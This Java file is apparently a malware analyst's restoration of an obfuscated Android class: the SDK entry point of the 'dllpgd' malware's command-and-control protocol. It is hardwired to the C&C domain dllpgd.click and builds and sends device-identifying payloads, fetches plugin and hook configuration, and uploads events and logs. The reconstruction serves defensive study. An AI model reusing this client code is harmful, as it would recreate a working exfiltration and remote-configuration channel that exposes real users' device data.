package c2;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: c13.nim5.ez8.h5_proto.DllpgdLiteSDK
 *
 * Main SDK entry point for the "dllpgd" malware C&C communication.
 * Provides a high-level API for:
 * - getConfig(): fetching configuration (plugins, hooks, session) from C&C
 * - updateEvent(): reporting telemetry events to C&C
 * - updateLog(): uploading log entries to C&C
 *
 * Also includes static helper methods that create sample/test payloads
 * with hardcoded test values (sample_device_id, com.example.app, etc.)
 *
 * The singleton INSTANCE connects to the C&C domain: dllpgd.click
 */
public class DllpgdLiteSDK {

    /** Singleton instance connected to the C&C domain: dllpgd.click */
    public static final DllpgdLiteSDK INSTANCE = new DllpgdLiteSDK("dllpgd.click");

    private final HttpGatewayClient httpClient;

    public DllpgdLiteSDK(String domain) {
        this.httpClient = new HttpGatewayClient(domain);
    }

    public DllpgdLiteSDK(String domain, int port, boolean useHttps) {
        this.httpClient = new HttpGatewayClient(domain, port, useHttps);
    }

    /**
     * Creates a sample Atom JSON payload with hardcoded test values.
     * Used for testing/debugging the C&C protocol.
     *
     * Sample values:
     * - deviceId: "sample_device_id"
     * - version: 208
     * - appPackageName: "com.example.app"
     * - appVersion: "1.0.0"
     * - gaId: "sample_ga_id"
     * - sessionId: "sample_session_id"
     * - appChannel: "default"
     * - isGeneratedBySubProcess: false
     * - deviceInfo: { locale: "zh_CN", timezone: "Asia/Shanghai", phoneModel: "TestDevice",
     *                 androidVersion: "13", phoneTimestamp: <current time> }
     * - pluginInfos: []
     */
    public static JSONObject createSampleAtom() throws JSONException {
        JSONObject atom = new JSONObject();
        atom.put("deviceId", "sample_device_id");
        atom.put("version", 208);
        atom.put("appPackageName", "com.example.app");
        atom.put("appVersion", "1.0.0");
        atom.put("gaId", "sample_ga_id");
        atom.put("sessionId", "sample_session_id");
        atom.put("appChannel", "default");
        atom.put("isGeneratedBySubProcess", false);

        JSONObject deviceInfo = new JSONObject();
        deviceInfo.put("locale", "zh_CN");
        deviceInfo.put("timezone", "Asia/Shanghai");
        deviceInfo.put("phoneModel", "TestDevice");
        deviceInfo.put("androidVersion", "13");
        deviceInfo.put("phoneTimestamp", System.currentTimeMillis());
        atom.put("deviceInfo", deviceInfo);

        atom.put("pluginInfos", new JSONArray());
        return atom;
    }

    /**
     * Creates a sample events JSON array with one test event.
     * - name: "sample_event"
     * - desc: "Sample event description"
     * - timestamp: <current time>
     */
    public static JSONArray createSampleEvents() throws JSONException {
        JSONArray events = new JSONArray();
        JSONObject event = new JSONObject();
        event.put("name", "sample_event");
        event.put("desc", "Sample event description");
        event.put("timestamp", System.currentTimeMillis());
        events.put(event);
        return events;
    }

    /**
     * Creates a sample logs JSON array with one test log entry.
     * - level: 1 (INFO)
     * - message: "Sample log message"
     * - tag: "DllpgdLiteSDK"
     * - timestamp: <current time>
     */
    public static JSONArray createSampleLogs() throws JSONException {
        JSONArray logs = new JSONArray();
        JSONObject log = new JSONObject();
        log.put("level", 1);
        log.put("message", "Sample log message");
        log.put("tag", "DllpgdLiteSDK");
        log.put("timestamp", System.currentTimeMillis());
        logs.put(log);
        return logs;
    }

    public JSONObject getConfig(JSONObject atomJson) throws Exception {
        return this.httpClient.getConfig(atomJson);
    }

    public CommonResponse updateEvent(UpdateEventRequest request) throws Exception {
        return this.httpClient.updateEvent(request);
    }

    public CommonResponse updateLog(UpdateLogRequest request) throws Exception {
        return this.httpClient.updateLog(request);
    }
}
